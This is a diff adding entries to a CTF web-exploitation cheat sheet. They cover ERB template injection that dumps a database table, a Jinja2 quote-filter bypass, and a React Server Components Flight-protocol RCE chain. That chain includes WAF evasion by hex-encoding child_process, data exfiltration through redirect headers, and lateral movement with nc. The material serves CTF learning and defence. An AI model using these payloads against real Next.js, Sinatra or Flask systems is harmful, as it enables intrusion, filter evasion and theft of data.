@@ -15,6 +15,7 @@
   - [Jinja2 RCE](#jinja2-rce)
   - [Go Template Injection](#go-template-injection)
   - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
+  - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
 - [SSRF](#ssrf)
   - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
   - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
@@ -51,6 +52,8 @@
 - [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
 - [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
 - [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
+- [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
+- [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
 - [SSRF → Docker API RCE Chain (H7CTF 2025)](#ssrf--docker-api-rce-chain-h7ctf-2025)
 
 ---
@@ -237,6 +240,47 @@ This decodes to `1 UNION SELECT username FROM users` after XML processing.
 ```
 <%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
 ```
+
+### ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)
+
+**Pattern (Treasure Hunt 5):** Sinatra (Ruby) app uses ERB templates. ERBSandbox restricts direct database access, but `Sequel::DATABASES` global list is unrestricted.
+
+**Detection:** Ruby/Sinatra app, `require 'erb'` in source. Cookie or parameter reflected in rendered response.
+
+```bash
+# Confirm SSTI
+curl --cookie 'name=<%= 7*7 %>' http://target/upload-highscore
+# Response contains "49"
+
+# Enumerate tables
+curl --cookie 'name=<%= Sequel::DATABASES.first.tables %>' ...
+# → [:players]
+
+# Dump schema
+curl --cookie 'name=<%= Sequel::DATABASES.first.schema(:players) %>' ...
+
+# Exfiltrate data
+curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
+```
+
+**Key insight:** Even when ERB sandboxes block `DB` or `DATABASE` constants, `Sequel::DATABASES` is a global array listing all open Sequel connections. It bypasses variable-name-based restrictions. In Sinatra, `<%= ... %>` tags in cookies or parameters that are reflected through ERB templates are common SSTI vectors.
+
+### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)
+
+**Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.
+
+```python
+# Quotes filtered → can't do {{ config['SECRET_KEY'] }} or string args
+# But keyword arguments don't need quotes:
+{{player.__dict__.update(power_level=9999999) or player.name}}
+```
+
+**How it works:**
+1. `player.__dict__.update(power_level=9999999)` — modifies object attribute directly via keyword arg (no quotes needed)
+2. `or player.name` — `dict.update()` returns `None` (falsy), so Jinja2 renders `player.name` as output
+3. The attribute change persists across requests in the session
+
+**Key insight:** When SSTI filters block quotes/strings, Python's keyword argument syntax (`func(key=value)`) operates without any string delimiters. `__dict__.update()` can modify any object attribute to bypass application logic (e.g., game state, auth checks, permission levels).
 
 ---
 
@@ -725,6 +769,140 @@ curl "http://target/?view_receipt=secret_XXXXXXXX"
 ```
 
 **Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.
+
+---
+
+## React Server Components Flight Protocol RCE (Ehax 2026)
+
+**Pattern (Flight Risk):** Next.js app using React Server Components (RSC). The Flight protocol deserializes client-sent objects on the server. A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary code execution (CVE-2025-55182).
+
+### Step 1 — Identify RSC via HTTP headers
+
+Intercept form submissions in the Network tab. RSC-specific headers:
+```http
+POST / HTTP/1.1
+Next-Action: 7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd
+Accept: text/x-component
+Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D
+Content-Type: multipart/form-data; boundary=----x
+```
+
+Confirm the server function name in client JS bundles:
+```javascript
+createServerReference("7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd", callServer, void 0, findSourceMapURL, "greetUser")
+```
+
+### Step 2 — Exploit Flight deserialization for RCE
+
+Craft a fake Flight chunk in the multipart form body. The `_prefix` field contains the payload. The constructor chain (`constructor → constructor → Function`) enables arbitrary JavaScript execution on the server.
+
+Request structure:
+```http
+POST / HTTP/1.1
+Host: target
+Next-Action: <action_hash>
+Accept: text/x-component
+Content-Type: multipart/form-data; boundary=----x
+
+------x
+Content-Disposition: form-data; name="0"
+
+THE FAKE FLIGHT CHUNK HERE
+------x
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------x--
+```
+
+### Step 3 — Exfiltrate data via NEXT_REDIRECT
+
+Next.js uses `NEXT_REDIRECT` errors internally for navigation. Abuse this to exfiltrate data through the `x-action-redirect` response header:
+
+```javascript
+throw Object.assign(new Error('NEXT_REDIRECT'), {
+  digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(RESULT)};307;`
+});
+```
+
+The server responds with:
+```http
+HTTP/1.1 303 See Other
+x-action-redirect: /login?a=<exfiltrated_data>;push
+```
+
+Example — confirm RCE with `process.pid`:
+```javascript
+throw Object.assign(new Error('NEXT_REDIRECT'), {
+  digest: `NEXT_REDIRECT;push;/login?a=${process.pid};307;`
+});
+// Response: x-action-redirect: /login?a=1;push
+```
+
+### Step 4 — Bypass WAF keyword filters
+
+When keywords like `child_process`, `execSync`, `mainModule` are blocked (403 response with "WAF Alert"):
+
+1. **String concatenation:**
+   ```javascript
+   p['main'+'Module']['requ'+'ire']('chi'+'ld_pro'+'cess')
+   ```
+
+2. **Hex encoding:**
+   ```javascript
+   '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'  // child_process
+   '\x65\x78\x65\x63\x53\x79\x6e\x63'                        // execSync
+   ```
+
+3. **Combined in payload:**
+   ```javascript
+   var p=process;
+   var m=p['main'+'Module'];
+   var r=m['requ'+'ire'];
+   var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
+   var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63']('id').toString();
+   throw Object.assign(new Error('NEXT_REDIRECT'),
+     {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
+   ```
+
+### Step 5 — Post-RCE enumeration
+
+```javascript
+// Working directory
+process.cwd()                        // → /app
+
+// Process arguments
+process.argv                         // → /usr/local/bin/node,/app/server.js
+
+// List files
+process.mainModule.require('fs').readdirSync(process.cwd()).join(',')
+
+// Read files
+process.mainModule.require('fs').readFileSync('vault.hint').toString('hex')
+
+// Check available modules
+Object.keys(process.mainModule.require('http'))
+```
+
+### Step 6 — Lateral movement to internal services
+
+After discovering internal services (e.g., from hint files):
+```javascript
+// Use nc to reach internal HTTP services
+var p=process;var m=p['main'+'Module'];var r=m['requ'+'ire'];
+var c=r('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73');
+var o=c['\x65\x78\x65\x63\x53\x79\x6e\x63'](
+  'printf "GET /flag.txt HTTP/1.1\\r\\nHost: internal-vault\\r\\n\\r\\n" | nc internal-vault 9009'
+).toString();
+throw Object.assign(new Error('NEXT_REDIRECT'),
+  {digest:`NEXT_REDIRECT;push;/login?a=${encodeURIComponent(o)};307;`});
+```
+
+**Key insight:** The NEXT_REDIRECT mechanism provides a reliable out-of-band data exfiltration channel through the `x-action-redirect` response header. Combined with WAF bypass via string concatenation and hex encoding, this enables full RCE even in filtered environments.
+
+**Full exploit chain:** Identify RSC headers → craft fake Flight chunk → bypass WAF → achieve RCE → enumerate filesystem → discover internal services → lateral movement via `nc` to retrieve flag.
+
+**Detection:** `Accept: text/x-component` + `Next-Action` header in requests, `createServerReference()` in client JS, Next.js Server Actions with user-controlled form data.
 
 ---
 
